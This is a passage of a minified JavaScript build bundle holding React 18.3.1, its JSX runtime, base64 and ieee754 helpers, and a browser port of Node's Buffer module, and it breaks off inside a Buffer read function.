var FC=Object.defineProperty;var zC=(n,e,t)=>e in n?FC(n,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):n[e]=t;var vn=(n,e,t)=>(zC(n,typeof e!="symbol"?e+"":e,t),t);function WC(n,e){for(var t=0;t<e.length;t++){const r=e[t];if(typeof r!="string"&&!Array.isArray(r)){for(const i in r)if(i!=="default"&&!(i in n)){const s=Object.getOwnPropertyDescriptor(r,i);s&&Object.defineProperty(n,i,s.get?s:{enumerable:!0,get:()=>r[i]})}}}return Object.freeze(Object.defineProperty(n,Symbol.toStringTag,{value:"Module"}))}(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const s of i)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&r(o)}).observe(document,{childList:!0,subtree:!0});function t(i){const s={};return i.integrity&&(s.integrity=i.integrity),i.referrerPolicy&&(s.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?s.credentials="include":i.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function r(i){if(i.ep)return;i.ep=!0;const s=t(i);fetch(i.href,s)}})();var hi=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof globalThis<"u"?globalThis:typeof self<"u"?self:{};function ca(n){return n&&n.__esModule&&Object.prototype.hasOwnProperty.call(n,"default")?n.default:n}function Ry(n){if(n.__esModule)return n;var e=n.default;if(typeof e=="function"){var t=function r(){return this instanceof r?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};t.prototype=e.prototype}else t={};return Object.defineProperty(t,"__esModule",{value:!0}),Object.keys(n).forEach(function(r){var i=Object.getOwnPropertyDescriptor(n,r);Object.defineProperty(t,r,i.get?i:{enumerable:!0,get:function(){return n[r]}})}),t}var _S={exports:{}},Kd={},ES={exports:{}},qe={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Yu=Symbol.for("react.element"),$C=Symbol.for("react.portal"),HC=Symbol.for("react.fragment"),qC=Symbol.for("react.strict_mode"),KC=Symbol.for("react.profiler"),GC=Symbol.for("react.provider"),QC=Symbol.for("react.context"),YC=Symbol.for("react.forward_ref"),ZC=Symbol.for("react.suspense"),JC=Symbol.for("react.memo"),XC=Symbol.for("react.lazy"),P_=Symbol.iterator;function eR(n){return n===null||typeof n!="object"?null:(n=P_&&n[P_]||n["@@iterator"],typeof n=="function"?n:null)}var IS={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},SS=Object.assign,TS={};function $l(n,e,t){this.props=n,this.context=e,this.refs=TS,this.updater=t||IS}$l.prototype.isReactComponent={};$l.prototype.setState=function(n,e){if(typeof n!="object"&&typeof n!="function"&&n!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,n,e,"setState")};$l.prototype.forceUpdate=function(n){this.updater.enqueueForceUpdate(this,n,"forceUpdate")};function AS(){}AS.prototype=$l.prototype;function My(n,e,t){this.props=n,this.context=e,this.refs=TS,this.updater=t||IS}var Ny=My.prototype=new AS;Ny.constructor=My;SS(Ny,$l.prototype);Ny.isPureReactComponent=!0;var L_=Array.isArray,bS=Object.prototype.hasOwnProperty,Py={current:null},xS={key:!0,ref:!0,__self:!0,__source:!0};function kS(n,e,t){var r,i={},s=null,o=null;if(e!=null)for(r in e.ref!==void 0&&(o=e.ref),e.key!==void 0&&(s=""+e.key),e)bS.call(e,r)&&!xS.hasOwnProperty(r)&&(i[r]=e[r]);var a=arguments.length-2;if(a===1)i.children=t;else if(1<a){for(var l=Array(a),u=0;u<a;u++)l[u]=arguments[u+2];i.children=l}if(n&&n.defaultProps)for(r in a=n.defaultProps,a)i[r]===void 0&&(i[r]=a[r]);return{$$typeof:Yu,type:n,key:s,ref:o,props:i,_owner:Py.current}}function tR(n,e){return{$$typeof:Yu,type:n.type,key:e,ref:n.ref,props:n.props,_owner:n._owner}}function Ly(n){return typeof n=="object"&&n!==null&&n.$$typeof===Yu}function nR(n){var e={"=":"=0",":":"=2"};return"$"+n.replace(/[=:]/g,function(t){return e[t]})}var D_=/\/+/g;function ug(n,e){return typeof n=="object"&&n!==null&&n.key!=null?nR(""+n.key):e.toString(36)}function ff(n,e,t,r,i){var s=typeof n;(s==="undefined"||s==="boolean")&&(n=null);var o=!1;if(n===null)o=!0;else switch(s){case"string":case"number":o=!0;break;case"object":switch(n.$$typeof){case Yu:case $C:o=!0}}if(o)return o=n,i=i(o),n=r===""?"."+ug(o,0):r,L_(i)?(t="",n!=null&&(t=n.replace(D_,"$&/")+"/"),ff(i,e,t,"",function(u){return u})):i!=null&&(Ly(i)&&(i=tR(i,t+(!i.key||o&&o.key===i.key?"":(""+i.key).replace(D_,"$&/")+"/")+n)),e.push(i)),1;if(o=0,r=r===""?".":r+":",L_(n))for(var a=0;a<n.length;a++){s=n[a];var l=r+ug(s,a);o+=ff(s,e,t,l,i)}else if(l=eR(n),typeof l=="function")for(n=l.call(n),a=0;!(s=n.next()).done;)s=s.value,l=r+ug(s,a++),o+=ff(s,e,t,l,i);else if(s==="object")throw e=String(n),Error("Objects are not valid as a React child (found: "+(e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e)+"). If you meant to render a collection of children, use an array instead.");return o}function Nh(n,e,t){if(n==null)return n;var r=[],i=0;return ff(n,r,"","",function(s){return e.call(t,s,i++)}),r}function rR(n){if(n._status===-1){var e=n._result;e=e(),e.then(function(t){(n._status===0||n._status===-1)&&(n._status=1,n._result=t)},function(t){(n._status===0||n._status===-1)&&(n._status=2,n._result=t)}),n._status===-1&&(n._status=0,n._result=e)}if(n._status===1)return n._result.default;throw n._result}var lr={current:null},df={transition:null},iR={ReactCurrentDispatcher:lr,ReactCurrentBatchConfig:df,ReactCurrentOwner:Py};function CS(){throw Error("act(...) is not supported in production builds of React.")}qe.Children={map:Nh,forEach:function(n,e,t){Nh(n,function(){e.apply(this,arguments)},t)},count:function(n){var e=0;return Nh(n,function(){e++}),e},toArray:function(n){return Nh(n,function(e){return e})||[]},only:function(n){if(!Ly(n))throw Error("React.Children.only expected to receive a single React element child.");return n}};qe.Component=$l;qe.Fragment=HC;qe.Profiler=KC;qe.PureComponent=My;qe.StrictMode=qC;qe.Suspense=ZC;qe.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=iR;qe.act=CS;qe.cloneElement=function(n,e,t){if(n==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+n+".");var r=SS({},n.props),i=n.key,s=n.ref,o=n._owner;if(e!=null){if(e.ref!==void 0&&(s=e.ref,o=Py.current),e.key!==void 0&&(i=""+e.key),n.type&&n.type.defaultProps)var a=n.type.defaultProps;for(l in e)bS.call(e,l)&&!xS.hasOwnProperty(l)&&(r[l]=e[l]===void 0&&a!==void 0?a[l]:e[l])}var l=arguments.length-2;if(l===1)r.children=t;else if(1<l){a=Array(l);for(var u=0;u<l;u++)a[u]=arguments[u+2];r.children=a}return{$$typeof:Yu,type:n.type,key:i,ref:s,props:r,_owner:o}};qe.createContext=function(n){return n={$$typeof:QC,_currentValue:n,_currentValue2:n,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},n.Provider={$$typeof:GC,_context:n},n.Consumer=n};qe.createElement=kS;qe.createFactory=function(n){var e=kS.bind(null,n);return e.type=n,e};qe.createRef=function(){return{current:null}};qe.forwardRef=function(n){return{$$typeof:YC,render:n}};qe.isValidElement=Ly;qe.lazy=function(n){return{$$typeof:XC,_payload:{_status:-1,_result:n},_init:rR}};qe.memo=function(n,e){return{$$typeof:JC,type:n,compare:e===void 0?null:e}};qe.startTransition=function(n){var e=df.transition;df.transition={};try{n()}finally{df.transition=e}};qe.unstable_act=CS;qe.useCallback=function(n,e){return lr.current.useCallback(n,e)};qe.useContext=function(n){return lr.current.useContext(n)};qe.useDebugValue=function(){};qe.useDeferredValue=function(n){return lr.current.useDeferredValue(n)};qe.useEffect=function(n,e){return lr.current.useEffect(n,e)};qe.useId=function(){return lr.current.useId()};qe.useImperativeHandle=function(n,e,t){return lr.current.useImperativeHandle(n,e,t)};qe.useInsertionEffect=function(n,e){return lr.current.useInsertionEffect(n,e)};qe.useLayoutEffect=function(n,e){return lr.current.useLayoutEffect(n,e)};qe.useMemo=function(n,e){return lr.current.useMemo(n,e)};qe.useReducer=function(n,e,t){return lr.current.useReducer(n,e,t)};qe.useRef=function(n){return lr.current.useRef(n)};qe.useState=function(n){return lr.current.useState(n)};qe.useSyncExternalStore=function(n,e,t){return lr.current.useSyncExternalStore(n,e,t)};qe.useTransition=function(){return lr.current.useTransition()};qe.version="18.3.1";ES.exports=qe;var Y=ES.exports;const ce=ca(Y),sR=WC({__proto__:null,default:ce},[Y]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var oR=Y,aR=Symbol.for("react.element"),lR=Symbol.for("react.fragment"),cR=Object.prototype.hasOwnProperty,uR=oR.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,hR={key:!0,ref:!0,__self:!0,__source:!0};function RS(n,e,t){var r,i={},s=null,o=null;t!==void 0&&(s=""+t),e.key!==void 0&&(s=""+e.key),e.ref!==void 0&&(o=e.ref);for(r in e)cR.call(e,r)&&!hR.hasOwnProperty(r)&&(i[r]=e[r]);if(n&&n.defaultProps)for(r in e=n.defaultProps,e)i[r]===void 0&&(i[r]=e[r]);return{$$typeof:aR,type:n,key:s,ref:o,props:i,_owner:uR.current}}Kd.Fragment=lR;Kd.jsx=RS;Kd.jsxs=RS;_S.exports=Kd;var te=_S.exports,Le={},Gd={};Gd.byteLength=pR;Gd.toByteArray=mR;Gd.fromByteArray=vR;var _i=[],jr=[],fR=typeof Uint8Array<"u"?Uint8Array:Array,hg="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";for(var Pa=0,dR=hg.length;Pa<dR;++Pa)_i[Pa]=hg[Pa],jr[hg.charCodeAt(Pa)]=Pa;jr["-".charCodeAt(0)]=62;jr["_".charCodeAt(0)]=63;function MS(n){var e=n.length;if(e%4>0)throw new Error("Invalid string. Length must be a multiple of 4");var t=n.indexOf("=");t===-1&&(t=e);var r=t===e?0:4-t%4;return[t,r]}function pR(n){var e=MS(n),t=e[0],r=e[1];return(t+r)*3/4-r}function gR(n,e,t){return(e+t)*3/4-t}function mR(n){var e,t=MS(n),r=t[0],i=t[1],s=new fR(gR(n,r,i)),o=0,a=i>0?r-4:r,l;for(l=0;l<a;l+=4)e=jr[n.charCodeAt(l)]<<18|jr[n.charCodeAt(l+1)]<<12|jr[n.charCodeAt(l+2)]<<6|jr[n.charCodeAt(l+3)],s[o++]=e>>16&255,s[o++]=e>>8&255,s[o++]=e&255;return i===2&&(e=jr[n.charCodeAt(l)]<<2|jr[n.charCodeAt(l+1)]>>4,s[o++]=e&255),i===1&&(e=jr[n.charCodeAt(l)]<<10|jr[n.charCodeAt(l+1)]<<4|jr[n.charCodeAt(l+2)]>>2,s[o++]=e>>8&255,s[o++]=e&255),s}function yR(n){return _i[n>>18&63]+_i[n>>12&63]+_i[n>>6&63]+_i[n&63]}function wR(n,e,t){for(var r,i=[],s=e;s<t;s+=3)r=(n[s]<<16&16711680)+(n[s+1]<<8&65280)+(n[s+2]&255),i.push(yR(r));return i.join("")}function vR(n){for(var e,t=n.length,r=t%3,i=[],s=16383,o=0,a=t-r;o<a;o+=s)i.push(wR(n,o,o+s>a?a:o+s));return r===1?(e=n[t-1],i.push(_i[e>>2]+_i[e<<4&63]+"==")):r===2&&(e=(n[t-2]<<8)+n[t-1],i.push(_i[e>>10]+_i[e>>4&63]+_i[e<<2&63]+"=")),i.join("")}var Dy={};/*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */Dy.read=function(n,e,t,r,i){var s,o,a=i*8-r-1,l=(1<<a)-1,u=l>>1,h=-7,f=t?i-1:0,m=t?-1:1,v=n[e+f];for(f+=m,s=v&(1<<-h)-1,v>>=-h,h+=a;h>0;s=s*256+n[e+f],f+=m,h-=8);for(o=s&(1<<-h)-1,s>>=-h,h+=r;h>0;o=o*256+n[e+f],f+=m,h-=8);if(s===0)s=1-u;else{if(s===l)return o?NaN:(v?-1:1)*(1/0);o=o+Math.pow(2,r),s=s-u}return(v?-1:1)*o*Math.pow(2,s-r)};Dy.write=function(n,e,t,r,i,s){var o,a,l,u=s*8-i-1,h=(1<<u)-1,f=h>>1,m=i===23?Math.pow(2,-24)-Math.pow(2,-77):0,v=r?0:s-1,x=r?1:-1,k=e<0||e===0&&1/e<0?1:0;for(e=Math.abs(e),isNaN(e)||e===1/0?(a=isNaN(e)?1:0,o=h):(o=Math.floor(Math.log(e)/Math.LN2),e*(l=Math.pow(2,-o))<1&&(o--,l*=2),o+f>=1?e+=m/l:e+=m*Math.pow(2,1-f),e*l>=2&&(o++,l/=2),o+f>=h?(a=0,o=h):o+f>=1?(a=(e*l-1)*Math.pow(2,i),o=o+f):(a=e*Math.pow(2,f-1)*Math.pow(2,i),o=0));i>=8;n[t+v]=a&255,v+=x,a/=256,i-=8);for(o=o<<i|a,u+=i;u>0;n[t+v]=o&255,v+=x,o/=256,u-=8);n[t+v-x]|=k*128};/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */(function(n){const e=Gd,t=Dy,r=typeof Symbol=="function"&&typeof Symbol.for=="function"?Symbol.for("nodejs.util.inspect.custom"):null;n.Buffer=a,n.SlowBuffer=b,n.INSPECT_MAX_BYTES=50;const i=2147483647;n.kMaxLength=i,a.TYPED_ARRAY_SUPPORT=s(),!a.TYPED_ARRAY_SUPPORT&&typeof console<"u"&&typeof console.error=="function"&&console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support.");function s(){try{const P=new Uint8Array(1),g={foo:function(){return 42}};return Object.setPrototypeOf(g,Uint8Array.prototype),Object.setPrototypeOf(P,g),P.foo()===42}catch{return!1}}Object.defineProperty(a.prototype,"parent",{enumerable:!0,get:function(){if(a.isBuffer(this))return this.buffer}}),Object.defineProperty(a.prototype,"offset",{enumerable:!0,get:function(){if(a.isBuffer(this))return this.byteOffset}});function o(P){if(P>i)throw new RangeError('The value "'+P+'" is invalid for option "size"');const g=new Uint8Array(P);return Object.setPrototypeOf(g,a.prototype),g}function a(P,g,w){if(typeof P=="number"){if(typeof g=="string")throw new TypeError('The "string" argument must be of type string. Received type number');return f(P)}return l(P,g,w)}a.poolSize=8192;function l(P,g,w){if(typeof P=="string")return m(P,g);if(ArrayBuffer.isView(P))return x(P);if(P==null)throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof P);if(on(P,ArrayBuffer)||P&&on(P.buffer,ArrayBuffer)||typeof SharedArrayBuffer<"u"&&(on(P,SharedArrayBuffer)||P&&on(P.buffer,SharedArrayBuffer)))return k(P,g,w);if(typeof P=="number")throw new TypeError('The "value" argument must not be of type number. Received type number');const F=P.valueOf&&P.valueOf();if(F!=null&&F!==P)return a.from(F,g,w);const G=I(P);if(G)return G;if(typeof Symbol<"u"&&Symbol.toPrimitive!=null&&typeof P[Symbol.toPrimitive]=="function")return a.from(P[Symbol.toPrimitive]("string"),g,w);throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof P)}a.from=function(P,g,w){return l(P,g,w)},Object.setPrototypeOf(a.prototype,Uint8Array.prototype),Object.setPrototypeOf(a,Uint8Array);function u(P){if(typeof P!="number")throw new TypeError('"size" argument must be of type number');if(P<0)throw new RangeError('The value "'+P+'" is invalid for option "size"')}function h(P,g,w){return u(P),P<=0?o(P):g!==void 0?typeof w=="string"?o(P).fill(g,w):o(P).fill(g):o(P)}a.alloc=function(P,g,w){return h(P,g,w)};function f(P){return u(P),o(P<0?0:S(P)|0)}a.allocUnsafe=function(P){return f(P)},a.allocUnsafeSlow=function(P){return f(P)};function m(P,g){if((typeof g!="string"||g==="")&&(g="utf8"),!a.isEncoding(g))throw new TypeError("Unknown encoding: "+g);const w=E(P,g)|0;let F=o(w);const G=F.write(P,g);return G!==w&&(F=F.slice(0,G)),F}function v(P){const g=P.length<0?0:S(P.length)|0,w=o(g);for(let F=0;F<g;F+=1)w[F]=P[F]&255;return w}function x(P){if(on(P,Uint8Array)){const g=new Uint8Array(P);return k(g.buffer,g.byteOffset,g.byteLength)}return v(P)}function k(P,g,w){if(g<0||P.byteLength<g)throw new RangeError('"offset" is outside of buffer bounds');if(P.byteLength<g+(w||0))throw new RangeError('"length" is outside of buffer bounds');let F;return g===void 0&&w===void 0?F=new Uint8Array(P):w===void 0?F=new Uint8Array(P,g):F=new Uint8Array(P,g,w),Object.setPrototypeOf(F,a.prototype),F}function I(P){if(a.isBuffer(P)){const g=S(P.length)|0,w=o(g);return w.length===0||P.copy(w,0,0,g),w}if(P.length!==void 0)return typeof P.length!="number"||lt(P.length)?o(0):v(P);if(P.type==="Buffer"&&Array.isArray(P.data))return v(P.data)}function S(P){if(P>=i)throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+i.toString(16)+" bytes");return P|0}function b(P){return+P!=P&&(P=0),a.alloc(+P)}a.isBuffer=function(g){return g!=null&&g._isBuffer===!0&&g!==a.prototype},a.compare=function(g,w){if(on(g,Uint8Array)&&(g=a.from(g,g.offset,g.byteLength)),on(w,Uint8Array)&&(w=a.from(w,w.offset,w.byteLength)),!a.isBuffer(g)||!a.isBuffer(w))throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');if(g===w)return 0;let F=g.length,G=w.length;for(let Z=0,ee=Math.min(F,G);Z<ee;++Z)if(g[Z]!==w[Z]){F=g[Z],G=w[Z];break}return F<G?-1:G<F?1:0},a.isEncoding=function(g){switch(String(g).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},a.concat=function(g,w){if(!Array.isArray(g))throw new TypeError('"list" argument must be an Array of Buffers');if(g.length===0)return a.alloc(0);let F;if(w===void 0)for(w=0,F=0;F<g.length;++F)w+=g[F].length;const G=a.allocUnsafe(w);let Z=0;for(F=0;F<g.length;++F){let ee=g[F];if(on(ee,Uint8Array))Z+ee.length>G.length?(a.isBuffer(ee)||(ee=a.from(ee)),ee.copy(G,Z)):Uint8Array.prototype.set.call(G,ee,Z);else if(a.isBuffer(ee))ee.copy(G,Z);else throw new TypeError('"list" argument must be an Array of Buffers');Z+=ee.length}return G};function E(P,g){if(a.isBuffer(P))return P.length;if(ArrayBuffer.isView(P)||on(P,ArrayBuffer))return P.byteLength;if(typeof P!="string")throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+typeof P);const w=P.length,F=arguments.length>2&&arguments[2]===!0;if(!F&&w===0)return 0;let G=!1;for(;;)switch(g){case"ascii":case"latin1":case"binary":return w;case"utf8":case"utf-8":return ot(P).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return w*2;case"hex":return w>>>1;case"base64":return at(P).length;default:if(G)return F?-1:ot(P).length;g=(""+g).toLowerCase(),G=!0}}a.byteLength=E;function U(P,g,w){let F=!1;if((g===void 0||g<0)&&(g=0),g>this.length||((w===void 0||w>this.length)&&(w=this.length),w<=0)||(w>>>=0,g>>>=0,w<=g))return"";for(P||(P="utf8");;)switch(P){case"hex":return j(this,g,w);case"utf8":case"utf-8":return d(this,g,w);case"ascii":return M(this,g,w);case"latin1":case"binary":return R(this,g,w);case"base64":return T(this,g,w);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return $(this,g,w);default:if(F)throw new TypeError("Unknown encoding: "+P);P=(P+"").toLowerCase(),F=!0}}a.prototype._isBuffer=!0;function H(P,g,w){const F=P[g];P[g]=P[w],P[w]=F}a.prototype.swap16=function(){const g=this.length;if(g%2!==0)throw new RangeError("Buffer size must be a multiple of 16-bits");for(let w=0;w<g;w+=2)H(this,w,w+1);return this},a.prototype.swap32=function(){const g=this.length;if(g%4!==0)throw new RangeError("Buffer size must be a multiple of 32-bits");for(let w=0;w<g;w+=4)H(this,w,w+3),H(this,w+1,w+2);return this},a.prototype.swap64=function(){const g=this.length;if(g%8!==0)throw new RangeError("Buffer size must be a multiple of 64-bits");for(let w=0;w<g;w+=8)H(this,w,w+7),H(this,w+1,w+6),H(this,w+2,w+5),H(this,w+3,w+4);return this},a.prototype.toString=function(){const g=this.length;return g===0?"":arguments.length===0?d(this,0,g):U.apply(this,arguments)},a.prototype.toLocaleString=a.prototype.toString,a.prototype.equals=function(g){if(!a.isBuffer(g))throw new TypeError("Argument must be a Buffer");return this===g?!0:a.compare(this,g)===0},a.prototype.inspect=function(){let g="";const w=n.INSPECT_MAX_BYTES;return g=this.toString("hex",0,w).replace(/(.{2})/g,"$1 ").trim(),this.length>w&&(g+=" ... "),"<Buffer "+g+">"},r&&(a.prototype[r]=a.prototype.inspect),a.prototype.compare=function(g,w,F,G,Z){if(on(g,Uint8Array)&&(g=a.from(g,g.offset,g.byteLength)),!a.isBuffer(g))throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type '+typeof g);if(w===void 0&&(w=0),F===void 0&&(F=g?g.length:0),G===void 0&&(G=0),Z===void 0&&(Z=this.length),w<0||F>g.length||G<0||Z>this.length)throw new RangeError("out of range index");if(G>=Z&&w>=F)return 0;if(G>=Z)return-1;if(w>=F)return 1;if(w>>>=0,F>>>=0,G>>>=0,Z>>>=0,this===g)return 0;let ee=Z-G,Oe=F-w;const Pe=Math.min(ee,Oe),Ce=this.slice(G,Z),mt=g.slice(w,F);for(let xe=0;xe<Pe;++xe)if(Ce[xe]!==mt[xe]){ee=Ce[xe],Oe=mt[xe];break}return ee<Oe?-1:Oe<ee?1:0};function q(P,g,w,F,G){if(P.length===0)return-1;if(typeof w=="string"?(F=w,w=0):w>2147483647?w=2147483647:w<-2147483648&&(w=-2147483648),w=+w,lt(w)&&(w=G?0:P.length-1),w<0&&(w=P.length+w),w>=P.length){if(G)return-1;w=P.length-1}else if(w<0)if(G)w=0;else return-1;if(typeof g=="string"&&(g=a.from(g,F)),a.isBuffer(g))return g.length===0?-1:L(P,g,w,F,G);if(typeof g=="number")return g=g&255,typeof Uint8Array.prototype.indexOf=="function"?G?Uint8Array.prototype.indexOf.call(P,g,w):Uint8Array.prototype.lastIndexOf.call(P,g,w):L(P,[g],w,F,G);throw new TypeError("val must be string, number or Buffer")}function L(P,g,w,F,G){let Z=1,ee=P.length,Oe=g.length;if(F!==void 0&&(F=String(F).toLowerCase(),F==="ucs2"||F==="ucs-2"||F==="utf16le"||F==="utf-16le")){if(P.length<2||g.length<2)return-1;Z=2,ee/=2,Oe/=2,w/=2}function Pe(mt,xe){return Z===1?mt[xe]:mt.readUInt16BE(xe*Z)}let Ce;if(G){let mt=-1;for(Ce=w;Ce<ee;Ce++)if(Pe(P,Ce)===Pe(g,mt===-1?0:Ce-mt)){if(mt===-1&&(mt=Ce),Ce-mt+1===Oe)return mt*Z}else mt!==-1&&(Ce-=Ce-mt),mt=-1}else for(w+Oe>ee&&(w=ee-Oe),Ce=w;Ce>=0;Ce--){let mt=!0;for(let xe=0;xe<Oe;xe++)if(Pe(P,Ce+xe)!==Pe(g,xe)){mt=!1;break}if(mt)return Ce}return-1}a.prototype.includes=function(g,w,F){return this.indexOf(g,w,F)!==-1},a.prototype.indexOf=function(g,w,F){return q(this,g,w,F,!0)},a.prototype.lastIndexOf=function(g,w,F){return q(this,g,w,F,!1)};function N(P,g,w,F){w=Number(w)||0;const G=P.length-w;F?(F=Number(F),F>G&&(F=G)):F=G;const Z=g.length;F>Z/2&&(F=Z/2);let ee;for(ee=0;ee<F;++ee){const Oe=parseInt(g.substr(ee*2,2),16);if(lt(Oe))return ee;P[w+ee]=Oe}return ee}function B(P,g,w,F){return Xe(ot(g,P.length-w),P,w,F)}function z(P,g,w,F){return Xe(vt(g),P,w,F)}function W(P,g,w,F){return Xe(at(g),P,w,F)}function K(P,g,w,F){return Xe(Oi(g,P.length-w),P,w,F)}a.prototype.write=function(g,w,F,G){if(w===void 0)G="utf8",F=this.length,w=0;else if(F===void 0&&typeof w=="string")G=w,F=this.length,w=0;else if(isFinite(w))w=w>>>0,isFinite(F)?(F=F>>>0,G===void 0&&(G="utf8")):(G=F,F=void 0);else throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");const Z=this.length-w;if((F===void 0||F>Z)&&(F=Z),g.length>0&&(F<0||w<0)||w>this.length)throw new RangeError("Attempt to write outside buffer bounds");G||(G="utf8");let ee=!1;for(;;)switch(G){case"hex":return N(this,g,w,F);case"utf8":case"utf-8":return B(this,g,w,F);case"ascii":case"latin1":case"binary":return z(this,g,w,F);case"base64":return W(this,g,w,F);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return K(this,g,w,F);default:if(ee)throw new TypeError("Unknown encoding: "+G);G=(""+G).toLowerCase(),ee=!0}},a.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}};function T(P,g,w){return g===0&&w===P.length?e.fromByteArray(P):e.fromByteArray(P.slice(g,w))}function d(P,g,w){w=Math.min(P.length,w);const F=[];let G=g;for(;G<w;){const Z=P[G];let ee=null,Oe=Z>239?4:Z>223?3:Z>191?2:1;if(G+Oe<=w){let Pe,Ce,mt,xe;switch(Oe){case 1:Z<128&&(ee=Z);break;case 2:Pe=P[G+1],(Pe&192)===128&&(xe=(Z&31)<<6|Pe&63,xe>127&&(ee=xe));break;case 3:Pe=P[G+1],Ce=P[G+2],(Pe&192)===128&&(Ce&192)===128&&(xe=(Z&15)<<12|(Pe&63)<<6|Ce&63,xe>2047&&(xe<55296||xe>57343)&&(ee=xe));break;case 4:Pe=P[G+1],Ce=P[G+2],mt=P[G+3],(Pe&192)===128&&(Ce&192)===128&&(mt&192)===128&&(xe=(Z&15)<<18|(Pe&63)<<12|(Ce&63)<<6|mt&63,xe>65535&&xe<1114112&&(ee=xe))}}ee===null?(ee=65533,Oe=1):ee>65535&&(ee-=65536,F.push(ee>>>10&1023|55296),ee=56320|ee&1023),F.push(ee),G+=Oe}return C(F)}const _=4096;function C(P){const g=P.length;if(g<=_)return String.fromCharCode.apply(String,P);let w="",F=0;for(;F<g;)w+=String.fromCharCode.apply(String,P.slice(F,F+=_));return w}function M(P,g,w){let F="";w=Math.min(P.length,w);for(let G=g;G<w;++G)F+=String.fromCharCode(P[G]&127);return F}function R(P,g,w){let F="";w=Math.min(P.length,w);for(let G=g;G<w;++G)F+=String.fromCharCode(P[G]);return F}function j(P,g,w){const F=P.length;(!g||g<0)&&(g=0),(!w||w<0||w>F)&&(w=F);let G="";for(let Z=g;Z<w;++Z)G+=ct[P[Z]];return G}function $(P,g,w){const F=P.slice(g,w);let G="";for(let Z=0;Z<F.length-1;Z+=2)G+=String.fromCharCode(F[Z]+F[Z+1]*256);return G}a.prototype.slice=function(g,w){const F=this.length;g=~~g,w=w===void 0?F:~~w,g<0?(g+=F,g<0&&(g=0)):g>F&&(g=F),w<0?(w+=F,w<0&&(w=0)):w>F&&(w=F),w<g&&(w=g);const G=this.subarray(g,w);return Object.setPrototypeOf(G,a.prototype),G};function D(P,g,w){if(P%1!==0||P<0)throw new RangeError("offset is not uint");if(P+g>w)throw new RangeError("Trying to access beyond buffer length")}a.prototype.readUintLE=a.prototype.readUIntLE=function(g,w,F){g=g>>>0,w=w>>>0,F||D(g,w,this.length);let G=this[g],Z=1,ee=0;for(;++ee<w&&(Z*=256);)G+=this[g+ee]*Z;return G},a.prototype.readUintBE=a.prototype.readUIntBE=function(g,w,F){g=g>>>0,w=w>>>0,F||D(g,w,this.length);let G=this[g+--w],Z=1;for(;w>0&&(Z*=256);)G+=this[g+--w]*Z;return G},a.prototype.readUint8=a.prototype.readUInt8=function(g,w){return g=g>>>0,w||D(g,1,this.length),this[g]},a.prototype.readUint16LE=a.prototype.readUInt16LE=function(g,w){return g=g>>>0,w||D(g,2,this.length),this[g]|this[g+1]<<8},a.prototype.readUint16BE=a.prototype.readUInt16BE=function(g,w){return g=g>>>0,w||D(g,2,this.length),this[g]<<8|this[g+1]},a.prototype.readUint32LE=a.prototype.readUInt32LE=function(g,w){return g=g>>>0,w||D(g,4,this.length),(this[g]|this[g+1]<<8|this[g+2]<<16)+this[g+3]*16777216},a.prototype.readUint32BE=a.prototype.readUInt32BE=function(g,w){return g=g>>>0,w||D(g,4,this.length),this[g]*16777216+(this[g+1]<<16|this[g+2]<<8|this[g+3])},a.prototype.readBigUInt64LE=wn(function(g){g=g>>>0,Pt(g,"offset");const w=this[g],F=this[g+7];(w===void 0||F===void 0)&&We(g,this.length-8);const G=w+this[++g]*2**8+this[++g]*2**16+this[++g]*2**24,Z=this[++g]+this[++g]*2**8+this[++g]*2**16+F*2**24;return BigInt(G)+(BigInt(Z)<<BigInt(32))}),a.prototype.readBigUInt64BE=wn(function(g){g=g>>>0,Pt(g,"offset");const w=this[g],F=this[g+7];(w===void 0||F===void 0)&&We(g,this.length-8);const 